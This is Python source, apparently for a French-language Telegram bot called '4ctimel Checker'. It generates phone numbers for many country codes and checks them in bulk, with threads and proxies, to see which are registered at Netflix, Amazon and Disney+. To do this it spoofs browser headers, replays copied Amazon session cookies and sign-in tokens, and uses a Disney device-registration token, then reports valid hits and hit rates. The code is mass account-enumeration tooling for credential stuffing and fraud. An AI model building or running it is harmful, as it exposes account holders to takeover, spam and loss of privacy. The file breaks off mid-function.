import contextlib
from telebot import types
import requests
import threading

import typing as t
if t.TYPE_CHECKING:
    import main
    import users

import time

import random

import bs4
import json

from random import choice, randint



cprox = 0

from tls_client import Session







def BASE(user, text, first=False):
        return f"""🔬 | 4ctimel™ Checker
        \n{text}"""


ccodes = [
    ['FR', 'France 🇫🇷', '+33'],
    ['IT', 'Italie 🇮🇹', '+39'],
    ['CH', 'Suisse 🇨🇭', '+41'],
    ['BE', 'Belgique 🇧🇪', '+32'],
    ['DE', 'Allemagne 🇩🇪', '+49'],
    ['LU', 'Luxembourg 🇱🇺', '+352'],
    ['ES', 'Espagne 🇪🇸', '+34'],
    ['AE', 'United Arab Emirates 🇦🇪', '+971'],
    ['SA', 'Saudi Arabia 🇸🇦', '+966'],
    ['QA', 'Qatar 🇶🇦', '+974'],
    ['BH', 'Bahrain 🇧🇭', '+973'],
    ['MY', 'Malaysia 🇲🇾', '+60'],
    ['SG', 'Singapore 🇸🇬', '+65'],
    ['AM', 'Armenia 🇦🇲', '+374'],
    ['GE', 'Georgia 🇬🇪', '+995'],
    ['CO', 'Colombie 🇨🇴', '+57'],
    ['NO', 'Norway 🇳🇴', '+47'],
    ['IL', 'Israel 🇮🇱', '+972'],
    ['CY', 'Cyprus 🇨🇾', '+357'],
    ['DK', 'Denmark 🇩🇰', '+45'],
    ['IS', 'Iceland 🇮🇸', '+354'],
    ['NL', 'Netherlands 🇳🇱', '+31'],
    ['MC', 'Monaco 🇲🇨', '+377'],
    ['FI', 'Finland 🇫🇮', '+358'],
    ['HU', 'Hungary 🇭🇺', '+36'],
    ['ZA', 'South Africa 🇿🇦', '+27'],
    ['SE', 'Sweden 🇸🇪', '+46'],
    ['za', 'South Africa 🇿🇦', '+22'],
    ['UK', 'United Kingdom 🇬🇧', '+44'],
    ['CZ', 'Czech Republic 🇨🇿', '+420'],
    ['KW', 'Kuwait 🇰🇼', '+965'],
    ['LV', 'Lettonie 🇱🇻', '+371'],
    ['AT', 'Autriche 🇦🇹', '+43']
]



disney_headers = {
    'Accept': 'application/json',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/json',
    'Connection': 'keep-alive',
    'Host': 'disney.api.edge.bamgrid.com',
    'Origin': 'https://www.disneyplus.com',
    'Referer': 'https://www.disneyplus.com/',
    'Sec-Ch-Ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'X-Application-Version': '1.1.2',
    'X-Bamsdk-Client-Id': 'disney-svod-3d9324fc',
    'X-Bamsdk-Platform': 'javascript/windows/chrome',
    'X-Bamsdk-Platform-Id': 'browser',
    'X-Bamsdk-Version': '22.1',
    'X-Dss-Edge-Accept': 'vnd.dss.edge+json; version=2',
    'X-Request-Id': '857325bc-a6b5-4561-90ee-190596333826'
}

disney_data = {
    'query': """
    query CheckAccount($email: String!) {
        check(email: $email) {
            operations
            nextOperation
        }
    }
    """,
    'variables': {
        'email': None
    }
}



amazon_headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'fr,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'signin-sso-state-fr=9a588507-c1d0-47d2-9b4e-24660962a172; session-id=259-0765909-8490911; ubid-acbfr=257-0984503-1653536; s_cc=true; s_nr=1628038460339-New; s_vnum=2060038460339%26vn%3D1; s_dslv=1628038460342; s_sq=%5B%5BB%5D%5D; s_ppv=28; lc-acbfr=fr_FR; sst-acbfr=Sst1|PQF8-IR2JwMpPCYbuYCWXsn0CUByhtpw3G-ru2dOH1cCAwob0wV9_PHM53N5vhYwOh_10q-TmrnyJiDIubhN1vQRwdPX6zr81XepEK4gwVCPuknVsOTraJuLC0KTDLWGpSH1zA7fOq5sI8sp8fDRlnH1nLMf1LgfkKNoSMXBG-bfJLJhyF5VfnhJ_ARRFXOqeEDXqYsSFjZOevjChkRdY4s7xdFORfxpv-R00B-KXv6bpxR5aMOjnQqHGWrJlldWQaAaFYqSpQ-DsuQfb4D5C1_Mrnc7AKc8KU9WPCsuxnvlu1w; i18n-prefs=EUR; session-token="79xix76gKPVVnFiaW9dcHSh+Um4/4J7yi5BR0BAjliXf2Cun5JLeD2BpFKgO1kZsu6ialy8NtAj9qauNFQgn7fHycrZVdsrloQ80RCMZAHbt/T1mWOxDYofcMLA46ZrcaBo1ad7d4dhlfpsZpeEYXjY6OrkE2oZJXv8GCZ3b64qVcmNDT6GuNEdiQSApa9f1CWCU/DwpfDeFd96cXaZltct5FJuJJ1PCv5++TQHAXogh56Hp4H6dkOetF2AAXHzc2cHoMDZFvQ0="; session-id-time=2259697171l; csm-hit=tb:CCFXXEQY6J81PR2CX5JM+b-1QVH157HS0JKGH9N9B30|1628977179563&t:1628977179563&adb:adblk_yes', 

        'downlink': '10',
        'ect': '4g',
        'origin': 'https://www.amazon.fr',
        'referer': 'https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&',
        'rtt': '150',
        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    }

amazon_data = {
    'appActionToken': 'Yq2mhgfDpdFgAc7Q0195zsKMhMgj3D',
    'appAction': 'SIGNIN_PWD_COLLECT',
    'subPageType': 'SignInClaimCollect',
    'openid.return_to': 'ape:aHR0cHM6Ly93d3cuYW1hem9uLmZyLz9yZWZfPW5hdl9zaWduaW4=',
    'prevRID': 'ape:MDU0NEE2SjhFRlFRUTYyN1dKVjQ=',
    'workflowState': 'eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.82kD-hdrp3qMJkrTTdkc7Kc08KLPQBHL_iQoQ2pjIS8D31IZSfbInA.90U5VKcKctZvMWjr.o5bTk4T5fy7FanxrQ70Wd9a7Yeg7j8PwNCf31MdIe_tCA2xU4aDIeFto4vZZ_WOuNIRDKX3wCSfPtNeRwWKZSYEf9iy5STM6hyqrBd8dn6HAj2scs056iFAFf6nbuTvZzZ4PMNkbe9XAlm49L9UhlE2WhNYp9J1C4v_BKloM8634tt3qqr6TJmE7sF2ALES8v27bQGYVbC0TT7gnvRhbd2J9KiXpNRw3ksFN9hxvbOmHSMd5yQ4LS9h8BxNWmO0d5_687P05l20JZ6TJHdY1-JD2aNnK4Gp96DGTQu2WYKexFuz0-wo3RJVqcJJUGQTTIKz9._B41CuwhGFlx-f0Rgma_bA',
    'password': '',
    'create': '0',
    'metadata1': 'ECdITeCs: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',
}

codes = { 
    'fr': 33,
    'be': 32,
    'de': 49,
    'lu': 352,
    'es': 34,
    'hu': 36,
    'uk': 44,
    'ch': 41,
    'it': 39,
    'sa': 966,
    'bh': 973,
    'my': 60,
    'no': 47,
    'dk': 45,
    'il': 972,
    'cy': 357,
    'is': 354,
    'cz': 420,
    'ae': 971,
    'qa': 974,
    'sg': 65,
    'am': 374,
    'ge': 995,
    'co': 57,
    'nl': 31,
    'mc': 377,
    'fi': 358,
    'hu': 36,
    'za': 22,
    'se': 46,
    'kw': 965,
    'lv': 371,
    'au': 4,
    'at': 43
}



class Markups:
    TYPECHECK = types.InlineKeyboardButton('🎪 GUI', callback_data='typecheck')
    SOON = types.InlineKeyboardButton('Soon', callback_data='Soon')
    MENU = types.InlineKeyboardButton('↩️ Retour', callback_data='menu')
    

    FULLMENU = types.InlineKeyboardMarkup()
    FULLMENU.add(MENU)

    CANCEL = types.InlineKeyboardMarkup()
    CANCEL.add(types.InlineKeyboardButton('❌ Annuler', callback_data='menu'))

    HOME = types.InlineKeyboardMarkup()
    HOME.row_width = 2

    HOME.add(
     	types.InlineKeyboardButton('🎪 Outils NL/ML', callback_data='outils'),
        types.InlineKeyboardButton('📱 Trier les opérateurs', callback_data='sort'), 
        types.InlineKeyboardButton('☄ Générer des numéros', callback_data='gen'),
        types.InlineKeyboardButton('⚙️ Paramètres', callback_data='settings')
    )

    HOME.add(
        types.InlineKeyboardButton('🔑 Check mes numéros', callback_data='check'),
        
   )

    PROGRESS = types.InlineKeyboardMarkup()
    PROGRESS.add(types.InlineKeyboardButton('❌ Annuler', callback_data='checkstop'),)
    PROGRESS.add(types.InlineKeyboardButton('⏸ Exporter', callback_data='export'))


class Checker:

    def __init__(self,
                 user: 'users.User',
                 nl: list[str]) -> None:
        self.user = user
        self.nl = nl

        self.progress = None
        self.progress_sent = 0
        self.checked = 0

        self.result: dict[str, dict[str, bool | None]] = {
            service: {}
            for service in user.toggler.choices
        }

        self.cprox = 0

        user.checker = self
        self.export_messages: list[types.Message] = []

        self.clocks = [
            "🕛",
            "🕐",
            "🕑",
            "🕒",
            "🕓",
            "🕔",
            "🕕",
            "🕖",
            "🕗",
            "🕘",
            "🕙",
            "🕚" 
        ]
        self.clock_index = 0

    def emoji(self):
        clock = self.clocks[self.clock_index]
        self.clock_index += 1
        if self.clock_index == len(self.clocks):
            self.clock_index = 0
        return clock

    def update_progress(self):
        total = len(self.nl)*len(self.user.toggler.choices)
                
        checked = sum(len(self.result[service]) for service in self.result)

        # + 300
        if checked < self.checked:
            return
        self.checked = checked
        valid = 0
        for service in self.result:
            for number in self.result[service]:
                if self.result[service][number]:
                    valid += 1

        r = round(checked / total * 100 / 10) * 10
        self.user.total = total
        self.user.result = self.result

        passed = time.time() - self.time

        pminutes, pseconds = divmod(passed, 60)

        per = checked/passed

        estimed = (total-checked)/per

        minutes, seconds = divmod(estimed, 60)

        hitrate = round(valid / checked * 100 , len(str(int(checked/100))))
        with open('settings.json') as f:
         settings = json.load(f)

        if settings['displaytype']:
           text = f"{valid} valides ✅\n〢 {r}% {'◽️' * int(r/10)}{'◼️' * int(10 - r/10)}"
        else:
           text = f"""_〢 {checked}/{total} checked 🔮_
_〢 {valid} valides ✅_

_〢 {int(per)} checks par seconde ⚡_
_〢 Hitrate: {str(hitrate).replace('.0', '')}% 🎯_
_〢 Temps écoulé: {int(pminutes)}min {round(pseconds)}s ⏳_
_〢 Temps restant estimé: {int(minutes)}min {round(seconds)}s {self.emoji()}_

_〢 {r}% {"◽️" * int(r/10)}{"◼️" * int(10 - r/10)}_"""

        formatted_text = BASE(self.user, text)
        self.user.bot.edit_message_text(
          formatted_text,
          self.progress.chat.id,
          self.progress.id,
          reply_markup=Markups.PROGRESS,
          parse_mode='Markdown'
        )

    def progression(self):
        while not self.stop and not self.user.end:
            try:
                self.update_progress()
                time.sleep(2)
            except Exception as e:
                # print(e)
                pass

    def check_group(self, number: int) -> None:
        self.running += 1
        for service in self.user.toggler.choices:
            if self.user.end:
                return
            # print(self.user.end)

            resp = None

            while resp is None:
                try:
                    if service == 'netflix':
                        resp = Checker.netflix(number, self)
                    elif service == 'amazon':
                        resp = Checker.amazon(number)
                    elif service == 'disney':
                        resp = Checker.disney(number)
                except Exception as e:
                    print(e)
                    resp = None
                # print(resp)
                # if resp is None:
                #     time.sleep(5)
                

            self.result[service][number] = resp
            self.user.checked = sum(len(self.result[service]) for service in self.result)
            
            
            if self.user.end:
                return
        self.running -= 1
                


    def check(self, prox) -> None:
        if 'disney' in self.user.toggler.choices:
            auth_req = requests.post(
                'https://disney.api.edge.bamgrid.com/graph/v1/device/graphql',
                json={
                    "operationName": "registerDevice",
                    "query": "mutation registerDevice($input: RegisterDeviceInput!) {\n            registerDevice(registerDevice: $input) {\n                grant {\n                    grantType\n                    assertion\n                }\n            }\n        }",
                    "variables": {
                        "input": {
                            "deviceFamily": "browser",
                            "applicationRuntime": "chrome",
                            "deviceProfile": "windows",
                            "deviceLanguage": "en",
                            "attributes": {
                                "operatingSystem": "n/a",
                                "operatingSystemVersion": "n/a"
                            }
                        }
                    }
                },
                headers=disney_headers | {'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84'}
            )

            access_token: str = auth_req.json()['extensions']['sdk']['token']['accessToken']
            disney_headers['authorization'] = access_token

        self.time = time.time()
        self.stop = False

        threading.Thread(target=self.progression).start()

        self.running = 0

        self.proxs = prox
        
        for l in self.nl:
            # while self.running > 100:
            #     pass
            while True:
                try:
                    # self.check_group(l)
                    threading.Thread(target=self.check_group, args=(l,)).start()

                    break
                except Exception as e:
                    print(e)
            if 'netflix' in self.user.toggler.choices:
                time.sleep(0.25)
            else:
                time.sleep(0.05)
            if self.user.end:
                break
            
        while self.running and not self.user.end:
            print(threading.active_count())
            pass



        self.stop = True

        self.user.bot.delete_message(
            self.progress.chat.id,
            self.progress.id
        )

        if self.user.end:
            # print("OUI")
            return

        try:
            del disney_headers['authorization']
        except:
            pass

        for message in self.export_messages:
